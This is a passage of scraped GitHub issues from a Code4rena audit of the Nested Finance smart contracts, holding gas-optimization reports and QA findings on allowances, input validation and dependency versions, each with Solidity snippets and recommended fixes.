14 | Using `private` rather than `public` for constants, saves gas | 4 | | 15 | Duplicated `require()`/`revert()` checks should be refactored to a modifier or function | 14 | | 16 | Division by two should use bit shifting | 2 | | 17 | `require()` or `revert()` statements that check input arguments should be at the top of the function | 1 | | 18 | Empty blocks should be removed or emit something | 2 | | ~~19~~ | ~~Use custom errors rather than `revert()`/`require()` strings to save gas~~ | ~~132~~ | | 20 | Functions guaranteed to revert when called by normal users can be marked `payable` | 27 | | 21 | Don't use `_msgSender()` if not supporting EIP-2771 | 13 |  ~~Total: 313 instances over 21 issues~~ Total: 147 instances over 18 issues    ## Gas Optimizations  ### 1. Using `calldata` instead of `memory` for read-only arguments in `external` functions saves gas When a function with a `memory` array is called externally, the `abi.decode()` step has to use a for-loop to copy each index of the `calldata` to the `memory` index. **Each iteration of this for-loop costs at least 60 gas** (i.e. `60 * <mem_array>.length`). Using `calldata` directly, obliviates the need for such a loop in the contract code and runtime execution.   If the array is passed to an `internal` function which passes the array to another internal function where the array is modified and therefore `memory` is used in the `external` call, it's still more gass-efficient to use `calldata` when the `external` function uses modifiers, since the modifiers may prevent the internal functions from being called. Structs have the same overhead as an array of length one  *There are 3 instances of this issue:* ```solidity File: contracts/governance/scripts/OperatorScripts.sol   #1  28:       function addOperator(IOperatorResolver.Operator memory operator, bytes32 name) external { ``` https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/scripts/OperatorScripts.sol#L28  ```solidity File: contracts/governance/scripts/OperatorScripts.sol   #2  52:       function deployAddOperators(bytes memory bytecode, tupleOperator[] memory operators) external { ``` https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/scripts/OperatorScripts.sol#L52  ```solidity File: contracts/governance/scripts/OperatorScripts.sol   #3  52:       function deployAddOperators(bytes memory bytecode, tupleOperator[] memory operators) external { ``` https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/scripts/OperatorScripts.sol#L52  ### 2. Using `storage` instead of `memory` for structs/arrays saves gas When fetching data from a storage location, assigning the data to a `memory` variable causes all fields of the struct/array to be read from storage, which incurs a Gcoldsload (**2100 gas**) for *each* field of the struct/array. If the fields are read from the new memory variable, they incur an additional `MLOAD` rather than a cheap stack read. Instead of declearing the variable with the `memory` keyword, declaring the variable with the `storage` keyword and caching any fields that need to be re-read in stack variables, will be much cheaper, only incuring the Gcoldsload for the fields actually read. The only time it makes sense to read the whole struct/array into a `memory` variable, is if the full struct/array is being returned by the function, is being passed to a function that requires `memory`, or if the array/struct is being read from another `memory` array/struct  *There is 1 instance of this issue:* ```solidity File: contracts/NestedFactory.sol   #1  123:          bytes32[] memory operatorsCache = operators; ``` https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L123  ### 3. Multiple accesses of a mapping/array should use a local variable cache The instances below point to the second+ access of a value inside a mapping/array, within a function. Caching a mapping's value in a local `storage` variable when the value is accessed [multiple times](https://gist.github.com/IllIllI000/ec23a57daa30a8f8ca8b9681c8ccefb0), saves **~42 gas per access** due to not having to recalculate the key's keccak256 hash (Gkeccak256 - **30 gas**) and that calculation's associated stack operations. Caching an array's struct avoids recalculating the array offsets into memory  *There are 4 instances of this issue:* ```solidity File: contracts/operators/Yearn/YearnVaultStorage.sol   #1  /// @audit vaults[vault] on line 33 34:           require(vaults[vault].lpToken == address(0), \"YVS: VAULT_ALREADY_HAS_LP\"); ``` https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Yearn/YearnVaultStorage.sol#L34  ```solidity File: contracts/governance/scripts/OperatorScripts.sol   #2  /// @audit operators[i] on line 68 69:               operatorsToImport[i] = IOperatorResolver.Operator(deployedAddress, operators[i].selector); ``` https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/scripts/OperatorScripts.sol#L69  ```solidity File: contracts/OperatorResolver.sol   #3  /// @audit operators[<etc>] on line 42 43:                   operators[names[i]].selector != destinations[i].selector ``` https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/OperatorResolver.sol#L43  ```solidity File: contracts/OperatorResolver.sol   #4  /// @audit destinations[i] on line 42 43:                   operators[names[i]].selector != destinations[i].selector ``` https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/OperatorResolver.sol#L43  ### 4. Add `unchecked {}` for subtractions where the operands cannot underflow because of a previous `require()` or `if`-statement `require(a <= b); x = b - a` => `require(a <= b); unchecked { x = b - a }`  *There are 2 instances of this issue:* ```solidity File: contracts/NestedFactory.sol   #1  /// @audit require() on line 428 431:                  uint256 underSpentAmount = _inputTokenAmount - amountSpent; ``` https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L431  ```solidity File: contracts/NestedFactory.sol   #2  /// @audit require() on line 495 497:                  uint256 underSpentAmount = _amountToSpend - amounts[1]; ``` https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L497  ### ~~5. `<array>.length` should not be looked up in every loop of a `for`-loop~~ The overheads outlined below are _PER LOOP_, excluding the first loop * storage arrays incur a Gwarmaccess (**100 gas**) * memory arrays use `MLOAD` (**3 gas**) * calldata arrays use `CALLDATALOAD` (**3 gas**)  Caching the length changes each of these to a `DUP<N>` (**3 gas**), and gets rid of the extra `DUP<N>` needed to store the stack offset  ~~*There are 10 instances of this issue:*~~ ```solidity File: contracts/governance/TimelockControllerEmergency.sol  84:           for (uint256 i = 0; i < proposers.length; ++i) {  89:           for (uint256 i = 0; i < executors.length; ++i) {  234:          for (uint256 i = 0; i < targets.length; ++i) {  324:          for (uint256 i = 0; i < targets.length; ++i) { ``` https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/TimelockControllerEmergency.sol#L84  ```solidity File: contracts/abstracts/MixinOperatorResolver.sol  37:           for (uint256 i = 0; i < requiredOperators.length; i++) {  56:           for (uint256 i = 0; i < requiredOperators.length; i++) { ``` https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/abstracts/MixinOperatorResolver.sol#L37  ```solidity File: contracts/OperatorResolver.sol  60:           for (uint256 i = 0; i < names.length; i++) {  75:           for (uint256 i = 0; i < destinations.length; i++) { ``` https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/OperatorResolver.sol#L60  ```solidity File: contracts/NestedFactory.sol  124:          for (uint256 i = 0; i < operatorsCache.length; i++) {  651:          for (uint256 i = 0; i < _batchedOrders.length; i++) { ``` https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L124  ### 6. `++i`/`i++` should be `unchecked{++i}`/`unchecked{i++}` when it is not possible for them to overflow, as is the case when used in `for`- and `while`-loops The `unchecked` keyword is new in solidity version 0.8.0, so this only applies to that version or higher, which these instances are. This saves **30-40 gas [per loop](https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#the-increment-in-for-loop-post-condition-can-be-made-unchecked)**  *There are 28 instances of this issue:* ```solidity File: contracts/operators/Beefy/BeefyVaultOperator.sol  18:           for (uint256 i; i < vaultsLength; i++) { ``` https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/BeefyVaultOperator.sol#L18  ```solidity File: contracts/operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol  27:           for (uint256 i; i < vaultsLength; i++) { ``` https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol#L27  ```solidity File: contracts/operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol  27:           for (uint256 i; i < vaultsLength; i++) { ``` https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol#L27  ```solidity File: contracts/operators/Yearn/YearnCurveVaultOperator.sol  42:           for (uint256 i; i < vaultsLength; i++) { ``` https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Yearn/YearnCurveVaultOperator.sol#L42  ```solidity File: contracts/governance/TimelockControllerEmergency.sol  84:           for (uint256 i = 0; i < proposers.length; ++i) {  89:           for (uint256 i = 0; i < executors.length; ++i) {  234:          for (uint256 i = 0; i < targets.length; ++i) {  324:          for (uint256 i = 0; i < targets.length; ++i) { ``` https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/TimelockControllerEmergency.sol#L84  ```solidity File: contracts/governance/scripts/OperatorScripts.sol  67:           for (uint256 i; i < operatorLength; i++) {  80:           for (uint256 i; i < operatorLength; i++) { ``` https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/scripts/OperatorScripts.sol#L67  ```solidity File: contracts/abstracts/MixinOperatorResolver.sol  37:           for (uint256 i = 0; i < requiredOperators.length; i++) {  56:           for (uint256 i = 0; i < requiredOperators.length; i++) { ``` https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/abstracts/MixinOperatorResolver.sol#L37  ```solidity File: contracts/OperatorResolver.sol  40:           for (uint256 i = 0; i < namesLength; i++) {  60:           for (uint256 i = 0; i < names.length; i++) {  75:           for (uint256 i = 0; i < destinations.length; i++) { ``` https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/OperatorResolver.sol#L40  ```solidity File: contracts/NestedFactory.sol  124:          for (uint256 i = 0; i < operatorsCache.length; i++) {  136:          for (uint256 i = 0; i < operatorsLength; i++) {  196:          for (uint256 i = 0; i < batchedOrdersLength; i++) {  256:          for (uint256 i = 0; i < tokensLength; i++) {  315:          for (uint256 i = 0; i < batchedOrdersLength; i++) {  333:          for (uint256 i = 0; i < batchedOrdersLength; i++) {  369:          for (uint256 i = 0; i < batchLength; i++) {  412:          for (uint256 i = 0; i < batchLength; i++) {  651:          for (uint256 i = 0; i < _batchedOrders.length; i++) { ``` https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L124  ```solidity File: contracts/libraries/CurveHelpers/CurveHelpers.sol  22:           for (uint256 i; i < 2; i++) {  42:           for (uint256 i; i < 3; i++) {  62:           for (uint256 i; i < 4; i++) {  86:           for (uint256 i; i < poolCoinAmount; i++) { ``` https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/libraries/CurveHelpers/CurveHelpers.sol#L22  ### 7. `require()`/`revert()` strings longer than 32 bytes cost extra gas Each extra memory word of bytes past the original 32 [incurs an MSTORE](https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#consider-having-short-revert-strings) which costs **3 gas**  *There are 12 instances of this issue:* ```solidity File: contracts/governance/TimelockControllerEmergency.sol  229:          require(targets.length == values.length, \"TimelockController: length mismatch\");  230:          require(targets.length == datas.length, \"TimelockController: length mismatch\");  243:          require(!isOperation(id), \"TimelockController: operation already scheduled\");  244:          require(delay >= getMinDelay(), \"TimelockController: insufficient delay\");  256:          require(isOperationPending(id), \"TimelockController: operation cannot be cancelled\");  319:          require(targets.length == values.length, \"TimelockController: length mismatch\");  320:          require(targets.length == datas.length, \"TimelockController: length mismatch\");  334:          require(isOperationReady(id), \"TimelockController: operation is not ready\");  335:          require(predecessor == bytes32(0) || isOperationDone(predecessor), \"TimelockController: missing dependency\");  342:          require(isOperationReady(id), \"TimelockController: operation is not ready\");  359:          require(success, \"TimelockController: underlying transaction reverted\");  375:          require(msg.sender == address(this), \"TimelockController: caller must be timelock\"); ``` https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/TimelockControllerEmergency.sol#L229  ### 8. Optimize names to save gas `public`/`external` function names and `public` member variable names can be optimized to save gas. See [this](https://gist.github.com/IllIllI000/a5d8b486a8259f9f77891a919febd1a9) link for an example of how it works. Below are the interfaces/abstract contracts that can be optimized so that the most frequently-called functions use the least amount of gas possible during method lookup. Method IDs that have two leading zero bytes can save **128 gas** each during deployment, and renaming functions to have lower method IDs will save **22 gas** per call, [per sorted position shifted](https://medium.com/joyso/solidity-how-does-function-name-affect-gas-consumption-in-smart-contract-47d270d8ac92)  *There are 2 instances of this issue:* ```solidity File: contracts/abstracts/OwnableProxyDelegation.sol   #1  /// @audit initialize() 10:   abstract contract OwnableProxyDelegation is Context { ``` https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/abstracts/OwnableProxyDelegation.sol#L10  ```solidity File: contracts/abstracts/MixinOperatorResolver.sol   #2  /// @audit resolverOperatorsRequired(), rebuildCache(), isResolverCached() 10:   abstract contract MixinOperatorResolver { ``` https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/abstracts/MixinOperatorResolver.sol#L10  ### 9. Using `bool`s for storage incurs overhead ```solidity     // Booleans are more expensive than uint256 or any type that takes up a full     // word because each write operation emits an extra SLOAD to first read the     // slot's contents, replace the bits taken up by the boolean, and then write     // back. This is the compiler's defense against contract upgrades and     // pointer aliasing, and it cannot be disabled. ``` https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27 Use `uint256(1)` and `uint256(2)` for true/false to avoid a Gwarmaccess (**[100 gas](https://gist.github.com/IllIllI000/1b70014db712f8572a72378321250058)**) for the extra SLOAD, and to avoid Gsset (**20000 gas**) when changing from 'false' to 'true', after having been 'true' in the past  *There is 1 instance of this issue:* ```solidity File: contracts/abstracts/OwnableProxyDelegation.sol   #1  18:       bool public initialized; ``` https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/abstracts/OwnableProxyDelegation.sol#L18  ### 10. It costs more gas to initialize non-`constant`/non-`immutable` variables to zero than to let the default of zero be applied Not overwriting the default for [stack variables](https://gist.github.com/IllIllI000/e075d189c1b23dce256cd166e28f3397) saves **8 gas**. Storage and memory variables have larger savings  *There are 18 instances of this issue:* ```solidity File: contracts/governance/TimelockControllerEmergency.sol  84:           for (uint256 i = 0; i < proposers.length; ++i) {  89:           for (uint256 i = 0; i < executors.length; ++i) {  234:          for (uint256 i = 0; i < targets.length; ++i) {  324:          for (uint256 i = 0; i < targets.length; ++i) { ``` https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/TimelockControllerEmergency.sol#L"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/73", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "valid"], "target": "2022-06-nested-findings", "body": "## Unlimited allowance is very dangerous  Nested finance use unlimited allowance in all contract that sent some token  contracts/libraries/ExchangeHelpers.sol ```         address _swapTarget,         bytes memory _swapCallData     ) internal returns (bool) {         setMaxAllowance(_sellToken, _swapTarget);     /// @param _token The token to use for the allowance setting     /// @param _spender Spender to allow     function setMaxAllowance(IERC20 _token, address _spender) internal { ```  contracts/mocks/DummyRouter.sol ```         NestedFactory(factory).destroy(nftId, IERC20(address(weth)), attackOrders);     }      function setMaxAllowance(IERC20 _token, address _spender) external {         ExchangeHelpers.setMaxAllowance(_token, _spender);     }      function setAllowance( ```  contracts/libraries/StakingLPVaultHelpers.sol ```         uint256 lpTokenToDeposit = lpToken.balanceOf(address(this)) - lpTokenBalanceBefore;         ExchangeHelpers.setMaxAllowance(lpToken, vault);         uint256 lpTokenBalanceBefore = lpToken.balanceOf(address(this));         ExchangeHelpers.setMaxAllowance(IERC20(token), address(pool));          if (poolCoinAmount == 2) { ```  contracts/operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol ```             tokenAmountIn = amount1;         }          ExchangeHelpers.setMaxAllowance(IERC20(swapToken), router);          address[] memory path = new address[](2);         require(pair.factory() == biswapRouter.factory(), \"BLVO: INVALID_VAULT\");          ExchangeHelpers.setMaxAllowance(IERC20(address(pair)), address(vault)); ```  contracts/operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol ```             swapToken = token1;             tokenAmountIn = amount1;         }          ExchangeHelpers.setMaxAllowance(IERC20(swapToken), router);         require(pair.factory() == uniswapRouter.factory(), \"BLVO: INVALID_VAULT\");          ExchangeHelpers.setMaxAllowance(IERC20(address(pair)), address(vault));          address cachedToken0 = pair.token0(); ```  contracts/operators/Paraswap/ParaswapOperator.sol ```         ExchangeHelpers.setMaxAllowance(sellToken, tokenTransferProxy);         (bool success, ) = augustusSwapper.call(swapCallData); ```  contracts/operators/Beefy/BeefyVaultOperator.sol ```         uint256 tokenBalanceBefore = token.balanceOf(address(this));          ExchangeHelpers.setMaxAllowance(token, vault); ```  contracts/operators/Yearn/YearnCurveVaultOperator.sol ```         uint256 vaultBalanceBefore = IERC20(vault).balanceOf(address(this));         uint256 ethBalanceBefore = weth.balanceOf(address(this));          ExchangeHelpers.setMaxAllowance(IERC20(address(weth)), address(withdrawer)); ```  contracts/NestedFactory.sol ```     ) private {         address originalOwner = nestedAsset.originalOwner(_nftId);         ExchangeHelpers.setMaxAllowance(_token, address(feeSplitter));             ExchangeHelpers.setMaxAllowance(IERC20(address(weth)), address(withdrawer));             withdrawer.withdraw(_amount); ```  If a contract that has max allowance is malicious, it may steal all tokens in the allowing contract. For example, if feeSplitter is malicious, it may steal all tokens in NestedFactory  ## poolCoinAmount validation  https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/libraries/StakingLPVaultHelpers.sol  poolCoinAmount must be 2, 3, 4 so, if it not fall in this range it should be reverted but now it doesn't  On every functions in this file add  ``` if (poolCoinAmount < 2 || poolCoinAmount > 4) revert ```  Change code to  ``` // SPDX-License-Identifier: GPL-3.0-or-later pragma solidity 0.8.14;  import \"./../Withdrawer.sol\"; import \"./../libraries/ExchangeHelpers.sol\"; import \"./../libraries/CurveHelpers/CurveHelpers.sol\"; import \"@openzeppelin/contracts/token/ERC20/IERC20.sol\"; import \"./../interfaces/external/ICurvePool/ICurvePool.sol\"; import \"./../interfaces/external/ICurvePool/ICurvePoolETH.sol\"; import \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\"; import \"./../interfaces/external/IStakingVault/IStakingVault.sol\"; import \"./../interfaces/external/ICurvePool/ICurvePoolNonETH.sol\";  error InvalidPoolCoinAmount(uint256 poolCoinAmount);  /// @notice Library for LP Staking Vaults deposit/withdraw library StakingLPVaultHelpers {     using SafeERC20 for IERC20;      /// @dev  Add liquidity in a Curve pool with ETH and deposit     ///       the LP token in a staking vault     /// @param vault The staking vault address to deposit into     /// @param pool The Curve pool to add liquitiy in     /// @param lpToken The Curve pool LP token     /// @param poolCoinAmount The number of token in the Curve pool     /// @param eth ETH address     /// @param amount ETH amount to add in the Curve pool     function _addLiquidityAndDepositETH(         address vault,         ICurvePoolETH pool,         IERC20 lpToken,         uint256 poolCoinAmount,         address eth,         uint256 amount     ) internal {         if (poolCoinAmount < 2 || poolCoinAmount > 4) revert InvalidPoolCoinAmount(poolCoinAmount);          uint256 lpTokenBalanceBefore = lpToken.balanceOf(address(this));          if (poolCoinAmount == 2) {             pool.add_liquidity{ value: amount }(CurveHelpers.getAmounts2Coins(pool, eth, amount), 0);         } else if (poolCoinAmount == 3) {             pool.add_liquidity{ value: amount }(CurveHelpers.getAmounts3Coins(pool, eth, amount), 0);         } else {             pool.add_liquidity{ value: amount }(CurveHelpers.getAmounts4Coins(pool, eth, amount), 0);         }          uint256 lpTokenToDeposit = lpToken.balanceOf(address(this)) - lpTokenBalanceBefore;         ExchangeHelpers.setMaxAllowance(lpToken, vault);         IStakingVault(vault).deposit(lpTokenToDeposit);     }      /// @dev  Add liquidity in a Curve pool and deposit     ///       the LP token in a staking vault     /// @param vault The staking vault address to deposit into     /// @param pool The Curve pool to add liquitiy in     /// @param lpToken The Curve pool lpToken     /// @param poolCoinAmount The number of token in the Curve pool     /// @param token Token to add in the Curve pool liquidity     /// @param amount Token amount to add in the Curve pool     function _addLiquidityAndDeposit(         address vault,         ICurvePoolNonETH pool,         IERC20 lpToken,         uint256 poolCoinAmount,         address token,         uint256 amount     ) internal {         if (poolCoinAmount < 2 || poolCoinAmount > 4) revert InvalidPoolCoinAmount(poolCoinAmount);          uint256 lpTokenBalanceBefore = lpToken.balanceOf(address(this));         ExchangeHelpers.setMaxAllowance(IERC20(token), address(pool));          if (poolCoinAmount == 2) {             pool.add_liquidity(CurveHelpers.getAmounts2Coins(pool, token, amount), 0);         } else if (poolCoinAmount == 3) {             pool.add_liquidity(CurveHelpers.getAmounts3Coins(pool, token, amount), 0);         } else {             pool.add_liquidity(CurveHelpers.getAmounts4Coins(pool, token, amount), 0);         }          uint256 lpTokenToDeposit = lpToken.balanceOf(address(this)) - lpTokenBalanceBefore;         ExchangeHelpers.setMaxAllowance(lpToken, vault);         IStakingVault(vault).deposit(lpTokenToDeposit);     }      /// @dev Withdraw the LP token from the staking vault and     ///      remove the liquidity from the Curve pool     /// @param vault The staking vault address to withdraw from     /// @param amount The amount to withdraw     /// @param pool The Curve pool to remove liquitiy from     /// @param lpToken The Curve pool LP token     /// @param poolCoinAmount The number of token in the Curve pool     /// @param outputToken Output token to receive     function _withdrawAndRemoveLiquidity128(         address vault,         uint256 amount,         ICurvePool pool,         IERC20 lpToken,         uint256 poolCoinAmount,         address outputToken     ) internal {         if (poolCoinAmount < 2 || poolCoinAmount > 4) revert InvalidPoolCoinAmount(poolCoinAmount);          uint256 lpTokenBalanceBefore = lpToken.balanceOf(address(this));         IStakingVault(vault).withdraw(amount);          bool success = CurveHelpers.removeLiquidityOneCoin(             pool,             lpToken.balanceOf(address(this)) - lpTokenBalanceBefore,             outputToken,             poolCoinAmount,             bytes4(keccak256(bytes(\"remove_liquidity_one_coin(uint256,int128,uint256)\")))         );          require(success, \"SDCSO: CURVE_RM_LIQUIDITY_FAILED\");     }      /// @dev Withdraw the LP token from the staking vault and     ///      remove the liquidity from the Curve pool     /// @param vault The staking vault address to withdraw from     /// @param amount The amount to withdraw     /// @param pool The Curve pool to remove liquitiy from     /// @param lpToken The Curve pool LP token     /// @param poolCoinAmount The number of token in the Curve pool     /// @param outputToken Output token to receive     function _withdrawAndRemoveLiquidity256(         address vault,         uint256 amount,         ICurvePool pool,         IERC20 lpToken,         uint256 poolCoinAmount,         address outputToken     ) internal {         if (poolCoinAmount < 2 || poolCoinAmount > 4) revert InvalidPoolCoinAmount(poolCoinAmount);          uint256 lpTokenBalanceBefore = lpToken.balanceOf(address(this));         IStakingVault(vault).withdraw(amount);          bool success = CurveHelpers.removeLiquidityOneCoin(             pool,             lpToken.balanceOf(address(this)) - lpTokenBalanceBefore,             outputToken,             poolCoinAmount,             bytes4(keccak256(bytes(\"remove_liquidity_one_coin(uint256,uint256,uint256)\")))         );          require(success, \"SDCSO: CURVE_RM_LIQUIDITY_FAILED\");     } } ```  ## @openzeppelin/contracts should be updated to ^4.4.2 as ^4.3.2 has many vulnerables  https://github.com/code-423n4/2022-06-nested/blob/main/package.json is using  ``` \"@openzeppelin/contracts\": \"^4.3.2\", ```  @openzeppelin/contracts 4.3.2 has these vulnerabilities from https://snyk.io/vuln/npm:%40openzeppelin%2Fcontracts  - Function Call With Incorrect Argument - Deserialization of Untrusted Data - Numeric Errors - Improper Initialization - Improper Input Validation  You should update @openzeppelin/contracts to ^4.4.2 to avoid these vulnerabilities."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/72", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "valid"], "target": "2022-06-nested-findings", "body": "### Add `namesLength > 0` check in `areOperatorsImported()` method  - `areOperatorsImported()` in [OperatorResolver.sol#L32-L49](https://github.com/code-423n4/2022-06-nested/blob/main/contracts/OperatorResolver.sol#L32-L49) returns `true` when input arrays are empty (ie. `[]`, `[]`).  ```solidity function areOperatorsImported(bytes32[] calldata names, Operator[] calldata destinations)     external     view     override     returns (bool) {     uint256 namesLength = names.length;     require(namesLength == destinations.length, \"OR: INPUTS_LENGTH_MUST_MATCH\");     for (uint256 i = 0; i < namesLength; i++) {         if (             operators[names[i]].implementation != destinations[i].implementation ||             operators[names[i]].selector != destinations[i].selector         ) {             return false;         }     }     return true; } ``` #### Recommendation  ```solidity require(namesLength > 0 \"empty names/destinations\"); ```"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/71", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "valid"], "target": "2022-06-nested-findings", "body": "## 1. Can save gas when call `_submitOutOrders()` with `_toReserve = false`  In case `_toReserve = false`, it still calculates `feesAmount` using `entryFees` but do not use the result anywhere. We can save gas by calculating `feesAmount` only when `_toReserve = true`  ## Affected Code  https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L443  ## Recommended Mitigation Steps  Only calculate `feesAmount` only when `_toReserve = true`  ``` if (_toReserve) {  feesAmount = (amountBought * entryFees) / 10000; _transferToReserveAndStore(_batchedOrders.outputToken, amountBought - feesAmount, _nftId); } ```  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/70", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "valid"], "target": "2022-06-nested-findings", "body": "## [N-01] Libraries, interfaces, and external imports can be ordered nicely E.g. group all libraries first, then interfaces, then OZ imports  https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/libraries/StakingLPVaultHelpers.sol#L4-L12"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/68", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "valid"], "target": "2022-06-nested-findings", "body": "1. The require statements could be put at the beginning part of a block of statements if it doesn\u2019t affect the logic to save gas. a. [require(_orders.length != 0, \"NF: INVALID_ORDERS\");](\"https://github.com/code-423n4/2022-06-nested/blob/main/contracts/NestedFactory.sol#L250\")   2. Initializing i to 0 inside a for loop is redundant. As its initialized to 0 by default.  Also i++ or ++I in the for loops can be put inside an unchecked block to save gas.   a. [for (uint256 i = 0; i < operatorsCache.length; i++) ](\"https://github.com/code-423n4/2022-06-nested/blob/main/contracts/NestedFactory.sol#L124\") b. [for (uint256 i = 0; i < operatorsLength; i++) ](\"https://github.com/code-423n4/2022-06-nested/blob/main/contracts/NestedFactory.sol#L136\") c. [for (uint256 i = 0; i < batchedOrdersLength; i++)](\"https://github.com/code-423n4/2022-06-nested/blob/main/contracts/NestedFactory.sol#L196\") d. [for (uint256 i = 0; i < tokensLength; i++)](\u201chttps://github.com/code-423n4/2022-06-nested/blob/main/contracts/NestedFactory.sol#L256\") e. [for (uint256 i = 0; i < batchedOrdersLength; i++)](\"https://github.com/code-423n4/2022-06-nested/blob/main/contracts/NestedFactory.sol#L315\") f. [for (uint256 i = 0; i < batchedOrdersLength; i++)](\"https://github.com/code-423n4/2022-06-nested/blob/main/contracts/NestedFactory.sol#L333\") g. [for (uint256 i = 0; i < batchLength; i++)](\"https://github.com/code-423n4/2022-06-nested/blob/main/contracts/NestedFactory.sol#L369\") h. [ for (uint256 i = 0; i < batchLength; i++)](\"https://github.com/code-423n4/2022-06-nested/blob/main/contracts/NestedFactory.sol#L412\") i. [for (uint256 i = 0; i < _batchedOrders.length; i++)](\"https://github.com/code-423n4/2022-06-nested/blob/main/contracts/NestedFactory.sol#L651\") j. [for (uint256 i = 0; i < namesLength; i++) ](\u201chttps://github.com/code-423n4/2022-06-nested/blob/main/contracts/OperatorResolver.sol#L40\u201d) k. [for (uint256 i = 0; i < names.length; i++)](\u201chttps://github.com/code-423n4/2022-06-nested/blob/main/contracts/OperatorResolver.sol#L60\u201d) l. [for (uint256 i = 0; i < destinations.length; i++) ](\u201chttps://github.com/code-423n4/2022-06-nested/blob/main/contracts/OperatorResolver.sol#L75\u201d) m. [  for (uint256 i = 0; i < requiredOperators.length; i++)](\u201chttps://github.com/code-423n4/2022-06-nested/blob/main/contracts/abstracts/MixinOperatorResolver.sol#L37\u201d) n. [  for (uint256 i = 0; i < requiredOperators.length; i++)](\u201chttps://github.com/code-423n4/2022-06-nested/blob/main/contracts/abstracts/MixinOperatorResolver.sol#L56\u201d) o. [for (uint256 i = 0; i < targets.length; ++i)](\u201chttps://github.com/code-423n4/2022-06-nested/blob/main/contracts/governance/TimelockControllerEmergency.sol#L234\u201d) p. [for (uint256 i = 0; i < targets.length; ++i)](\u201chttps://github.com/code-423n4/2022-06-nested/blob/main/contracts/governance/TimelockControllerEmergency.sol#L324\u201d)   3. Unless it was introduced for readability saving memory to memory is redundant. [address token = 